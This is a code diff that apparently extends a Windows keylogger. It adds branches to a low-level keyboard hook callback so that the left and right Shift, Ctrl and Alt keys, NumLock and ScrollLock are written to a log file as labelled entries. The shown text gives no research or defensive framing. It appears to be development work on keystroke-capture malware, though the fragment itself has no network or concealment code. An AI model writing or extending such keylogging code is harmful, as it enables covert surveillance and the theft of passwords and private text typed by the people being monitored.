@@ -253,6 +253,46 @@ LRESULT CALLBACK LowLevelKeyboardProc(
 				sprintf_s(logEntry, sizeof(logEntry), "[DOWN_ARROW]");
 				write_to_file(logEntry);
 			}
+			else if (keyCode == VK_LSHIFT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LSHIFT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_RSHIFT)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[RSHIFT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LCONTROL)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LCTRL]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_RCONTROL)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[RCTRL]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_LMENU)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[LALT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_RMENU)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[RALT]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_NUMLOCK)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[NUMLOCK]");
+				write_to_file(logEntry);
+			}
+			else if (keyCode == VK_SCROLL)
+			{
+				sprintf_s(logEntry, sizeof(logEntry), "[SCROLL]");
+				write_to_file(logEntry);
+			}
 			else
 			{
 
